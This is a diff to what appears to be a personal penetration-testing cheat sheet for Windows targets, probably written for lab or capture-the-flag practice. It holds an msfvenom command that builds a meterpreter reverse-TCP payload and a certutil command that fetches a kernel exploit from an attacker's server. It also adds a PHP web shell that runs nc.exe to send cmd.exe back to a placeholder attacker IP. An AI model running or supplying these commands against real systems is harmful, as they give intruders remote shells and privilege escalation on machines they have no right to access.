@@ -42,7 +42,7 @@ cd /users/administrator - command to get to administrator directory.
 ---
 
 ```
-## Reverse shell using ftp and meterpreter
+## Reverse shell using FTP/SMB and meterpreter
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
 ---
@@ -150,4 +150,11 @@ Now lets get systeminfo and lets find an exploit for the kernel version.
 we found our kernel exploit lets find a writtable place and upload it to the windows shell with the next command:
 
 certutil -urlcache -f http://X.X.X.X/file_name file_name(on the windows machine)
+```
+# Reverse shell using FTP/SMB and php
+```
+First we need to locate out nc.exe and upload it to the FTP/SMB server.
+After we uploaded the nc.exe we need to create our reverse_shell.php file, we can use the next command:
+---<?php system('nc.exe -e cmd.exe x.x.x.x $PORT')?>---
+After we've uploaded the file we can execute it and get a reverse shell.
 ```
